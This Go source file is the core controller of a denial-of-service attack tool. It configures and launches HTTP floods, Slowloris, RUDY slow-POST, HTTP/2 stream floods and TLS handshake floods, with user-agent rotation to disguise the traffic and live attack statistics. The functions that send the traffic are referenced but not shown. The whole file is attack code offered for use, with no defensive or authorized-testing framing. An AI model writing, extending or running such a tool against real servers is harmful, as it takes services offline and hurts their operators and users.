package ddos

import (
	"context"
	"fmt"
	"sync/atomic"
	"time"
)

// New creates a new DDoS attack instance
func New(config DDoSConfig) *DDoSAttack {
	// Set defaults
	if config.Method == "" {
		config.Method = "GET"
	}
	if config.MaxThreads <= 0 {
		config.MaxThreads = 100
	}
	if config.Duration <= 0 {
		config.Duration = 60 * time.Second
	}
	if config.Timeout <= 0 {
		config.Timeout = 5 * time.Second
	}
	if config.AttackMode == "" {
		config.AttackMode = ModeFlood
	}
	if config.SlowlorisDelay <= 0 {
		config.SlowlorisDelay = 10 * time.Second
	}
	if config.Headers == nil {
		config.Headers = make(map[string]string)
	}
	if config.MaxStreamsPerConn <= 0 {
		config.MaxStreamsPerConn = 100 // Default HTTP/2 streams per connection
	}
	if config.RUDYDelay <= 0 {
		config.RUDYDelay = 10 * time.Second // Default delay between bytes
	}
	if config.RUDYBodySize <= 0 {
		config.RUDYBodySize = 1024 * 1024 // Default 1MB body size
	}

	attack := &DDoSAttack{
		config: config,
	}

	// Load user agents (custom from file or built-in)
	if config.UseCustomUserAgents && config.UserAgentFilePath != "" {
		if agents, err := loadUserAgentsFromFile(config.UserAgentFilePath); err == nil && len(agents) > 0 {
			attack.userAgents = agents
		} else {
			// Fallback to built-in agents if file loading fails
			attack.userAgents = getBuiltInUserAgents()
		}
	} else {
		// Use built-in user agents
		attack.userAgents = getBuiltInUserAgents()
	}

	return attack
}

// Start begins the DDoS attack
func (d *DDoSAttack) Start(ctx context.Context) error {
	d.mu.Lock()
	if d.running {
		d.mu.Unlock()
		return fmt.Errorf("attack already running")
	}
	d.running = true
	d.mu.Unlock()

	// Create cancellable context with timeout
	d.ctx, d.cancel = context.WithTimeout(ctx, d.config.Duration)
	d.startTime = time.Now()

	// Reset counters
	atomic.StoreInt64(&d.requestsSent, 0)
	atomic.StoreInt64(&d.requestsSuccess, 0)
	atomic.StoreInt64(&d.requestsFailed, 0)
	atomic.StoreInt64(&d.bytesSent, 0)
	atomic.StoreInt64(&d.bytesReceived, 0)
	atomic.StoreInt64(&d.activeConns, 0)
	atomic.StoreInt64(&d.totalResponseTime, 0)

	// Start progress reporter
	go d.reportProgress()

	// Check if TLS handshake flood is enabled
	if d.config.UseTLSAttack && d.config.TLSHandshakeFlood {
		d.startTLSHandshakeFlood()
		return nil
	}

	// Start workers based on attack mode
	switch d.config.AttackMode {
	case ModeFlood:
		d.startFloodAttack()
	case ModeSlowloris:
		d.startSlowlorisAttack()
	case ModeMixed:
		// Split threads between flood and slowloris
		floodThreads := d.config.MaxThreads * 70 / 100
		slowThreads := d.config.MaxThreads - floodThreads
		d.startFloodWorkers(floodThreads)
		d.startSlowlorisWorkers(slowThreads)
	case ModeHTTP2StreamFlood:
		d.startHTTP2StreamFlood()
	case ModeRUDY:
		d.startRUDYAttack()
	}

	return nil
}

// Wait waits for the attack to complete
func (d *DDoSAttack) Wait() {
	d.wg.Wait()
	d.mu.Lock()
	d.running = false
	d.mu.Unlock()
}

// Stop stops the attack gracefully
func (d *DDoSAttack) Stop() {
	if d.cancel != nil {
		d.cancel()
	}
}

// GetStats returns current attack statistics
func (d *DDoSAttack) GetStats() AttackStats {
	elapsed := time.Since(d.startTime)
	sent := atomic.LoadInt64(&d.requestsSent)
	totalRespTime := atomic.LoadInt64(&d.totalResponseTime)

	var avgRespTime time.Duration
	if sent > 0 {
		avgRespTime = time.Duration(totalRespTime / sent)
	}

	var rps float64
	if elapsed.Seconds() > 0 {
		rps = float64(sent) / elapsed.Seconds()
	}

	return AttackStats{
		RequestsSent:      sent,
		RequestsSuccess:   atomic.LoadInt64(&d.requestsSuccess),
		RequestsFailed:    atomic.LoadInt64(&d.requestsFailed),
		BytesSent:         atomic.LoadInt64(&d.bytesSent),
		BytesReceived:     atomic.LoadInt64(&d.bytesReceived),
		ActiveConnections: atomic.LoadInt64(&d.activeConns),
		AvgResponseTime:   avgRespTime,
		ElapsedTime:       elapsed,
		RequestsPerSec:    rps,
	}
}

// IsRunning returns whether the attack is currently running
func (d *DDoSAttack) IsRunning() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.running
}

// reportProgress periodically calls the progress callback
func (d *DDoSAttack) reportProgress() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-d.ctx.Done():
			// Final stats report
			if d.config.OnProgress != nil {
				d.config.OnProgress(d.GetStats())
			}
			return
		case <-ticker.C:
			if d.config.OnProgress != nil {
				d.config.OnProgress(d.GetStats())
			}
		}
	}
}

